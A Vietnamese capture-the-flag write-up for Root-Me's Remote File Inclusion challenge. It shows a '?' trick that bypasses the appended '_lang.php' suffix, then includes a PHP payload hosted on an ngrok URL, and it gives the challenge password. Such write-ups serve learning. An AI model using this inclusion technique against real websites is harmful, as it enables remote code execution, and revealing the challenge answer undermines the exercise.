# WRITE UP

**Challenge:** [Remote File Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

Website có thiết lập parameter ?lang để đọc source từ lang.php:

<img src="./media/image1.png" style="width:6.5in;height:1.40556in" alt="Graphical user interface, text Description automatically generated" />

Fuzz vào URL thì ta biết được, server sẽ tự động concat thêm ‘\_lang.php’ vào cuối keyword ta gán vào ?lang:

<img src="./media/image2.png" style="width:6.5in;height:1.08681in" alt="Graphical user interface, text, application Description automatically generated" />

Challenge này thử thách về RFI, ta thử chèn một website bất kỳ vào ?lang:

<img src="./media/image3.png" style="width:6.5in;height:1.2in" alt="Graphical user interface, text Description automatically generated" />

Như ban nãy, server tự concat thêm ‘\_lang.php’, ta sử dụng **‘?’** để bypass phần concat với payload: http://challenge01.root-me.org/web-serveur/ch13/?lang=https://github.com/nh4ttruong?

<img src="./media/image4.png" style="width:6.5in;height:3.12083in" alt="A screenshot of a computer Description automatically generated" />

Bypass thành công, giờ thì ta sử dụng server để RFI qua challenge này. Set-up một file tên là ntruong.txt với content là payload PHP:

<img src="./media/image5.png" style="width:6.5in;height:0.67917in" />

Sử dụng ngrok server để public IP Address:

<img src="./media/image6.png" style="width:6.5in;height:3.32917in" alt="A screenshot of a computer Description automatically generated" />

-   URL để RFI: <https://f512-14-241-170-199.ap.ngrok.io/ntruong.txt>

<img src="./media/image7.png" style="width:6.5in;height:0.50694in" />

Giờ thì gắn vào ?lang ta được:

<img src="./media/image8.png" style="width:6.5in;height:3.57051in" alt="Graphical user interface, application, Word Description automatically generated" />

-   Password: R3m0t3\_iS\_r3aL1y\_3v1l

<img src="./media/image9.png" style="width:6.5in;height:3.4359in" alt="A screenshot of a computer Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
